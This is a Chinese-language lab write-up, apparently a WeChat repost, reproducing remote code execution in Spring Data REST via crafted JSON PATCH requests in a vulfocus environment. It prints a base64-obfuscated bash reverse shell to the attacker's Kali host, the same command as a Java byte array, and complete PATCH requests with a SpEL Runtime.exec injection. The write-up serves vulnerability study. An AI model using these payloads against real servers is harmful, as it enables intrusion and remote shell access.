> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Jp0LXrFuavhzPlGHlWYzJQ)

0x00 前言
-------

Spring-data-rest 服务器在处理 PATCH 请求时，攻击者可以构造恶意的 PATCH 请求并发送给 spring-date-rest 服务器，通过构造好的 JSON 数据来执行任意 Java 代码

影响范围：

Spring Data REST versions < 2.5.12, 2.6.7, 3.0 RC3

Spring Boot version < 2.0.0M4

Spring Data release trains < Kay-RC3

0x01 环境
-------

    vulfocus 漏洞环境

    kali：192.168.111.128

0x02 复现过程
---------

### 1、访问，构造对象：

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgz05SLspBN2dej19jbLOugRWzg2vs8DG3Uh6e1rfDeuKWzTV9TBzFl0psuUkYYcVe0mGfhT97Ec0A/640?wx_fmt=png)

查看 profile：

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgz05SLspBN2dej19jbLOugRvHo5DficzmicMhAXgJwFeMEWic3Pichnl14X719ak01UluP3dZ5ZQwwxzQ/640?wx_fmt=png)

查看 profile/persons：

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgz05SLspBN2dej19jbLOugRCN3GesVLuvvrPBJMj4Rf8kGMibVhiaHjOZWRAc1KVEndPlxSOPDFJTtA/640?wx_fmt=png)

根据参数构造对象：

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgz05SLspBN2dej19jbLOugRtFpXesLkvpvCmZa1vHu7Rz9LwqaxpGlw7ibiaT7ricCrAFB7m4GKJmUpg/640?wx_fmt=png)

```
{"firstName":"w","lastName":"q"}
```

### 2、构造 payload

(1) 将反弹 shell 的 payload 编码为 Java 格式：

在线编码网站：http://www.jackson-t.ca/runtime-exec-payloads.html

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgz05SLspBN2dej19jbLOugR1aAicgQ0ItYO3MxtVMtVtr0nKq6K0ZT3D9Dz3WmeYbHt8Uw6asWQyLg/640?wx_fmt=png)

```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMS4xMjgvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}
```

```
new byte[]{98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,120,79,84,73,117,77,84,89,52,76,106,69,120,77,83,52,120,77,106,103,118,78,68,81,48,78,67,65,119,80,105,89,120,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125}
```

转十进制：https://www.osgeo.cn/app/s2650

```
PATCH /persons/1 HTTP/1.1
Host: 192.168.111.134:17183
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json-patch+json
Content-Length: 202

[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,120,79,84,73,117,77,84,89,52,76,106,69,120,77,83,52,120,77,106,103,118,78,68,81,48,78,67,65,119,80,105,89,120,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125}))/lastName", "value": "vulhub" }]
```

```
(3) 构造数据包：
```

访问：http://your-ip:17183/customers/1

```
PATCH /persons/1 HTTP/1.1
Host: 192.168.111.134:17183
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json-patch+json
Content-Length: 202
[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,120,79,84,73,117,77,84,89,52,76,106,69,120,77,83,52,120,77,106,103,118,78,68,81,48,78,67,65,119,80,105,89,120,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125}))/lastName", "value": "vulhub" }]
```

(4) kali 开启监听

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgz05SLspBN2dej19jbLOugRSHa6snIOAVGIDnGZby0IgFZ2qQELsEiaricuLmxhibXMopaDMXIP7A9Jw/640?wx_fmt=png)

(5) 发送 payload，反弹 shell

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgz05SLspBN2dej19jbLOugR1vAcWum1HJ4Eiba9HuREiage0X9jDZwia9x0fZYz1Aga58FGL9tjiaEbog/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgz05SLspBN2dej19jbLOugRPtvYKAFvZHz3FaXVthQ6vUVnAMxgnPe8q1urSJiaica8muAXWJDD626g/640?wx_fmt=png)

0x03 修复建议
---------

    官方已经发布新版本修复了该漏洞，受影响的用户可升级至最新版本来防护该漏洞

  

**☆ END ☆**

公众号

![](https://mmbiz.qpic.cn/mmbiz_gif/6aVaON9Kibf7jNIAOgqwdCv2J77riaDsoMDSpLqoaUiao8aD9r3FwP0gFU2Psuqv6SgVAPhib8hibvO8CaEM8wu1Arw/640?wx_fmt=gif)